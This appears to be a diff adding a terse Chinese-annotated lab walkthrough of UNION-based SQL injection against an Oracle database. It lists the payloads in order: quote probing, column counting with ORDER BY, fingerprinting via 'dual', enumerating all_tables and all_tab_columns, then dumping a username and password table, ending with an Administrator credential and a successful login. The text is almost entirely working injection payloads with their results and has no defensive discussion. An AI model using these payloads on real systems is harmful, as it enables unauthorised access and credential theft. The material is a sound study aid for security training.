@@ -1,0 +1,28 @@
+SQL 注入攻击，在 Oracle 上列出数据库内容:
+
+'
+'--
+' Or 1=1--
+' Order by 3-- >> error
+' Order by 2-- >> ok
+' Union select null, null-- >> error
+>> 推测是Oracle数据库
+' Union select null, null from dual-- >> ok
+' Union select 'a', null from dual-- >> ok
+' Union select 'a', 'b' from dual-- >> ok
+' Union select table_name, null from all_tables--
+>> 爆库 ctrl+f => users
+USERS_ASDUXX
+>>
+' Union select column_name, null from all_tab_columns where table_name = 'USERS_ASDUXX'--
+>> 爆表
+USERNAME_VJMCYA
+PASSWORD_MBULNY
+>>
+' Union select USERNAME_VJMCYA, PASSWORD_MBULNY from USERS_ASDUXX--
+>> get
+Administrator
+8b22zatwj3nd9h054g7h
+>> login and congratulations
+
+
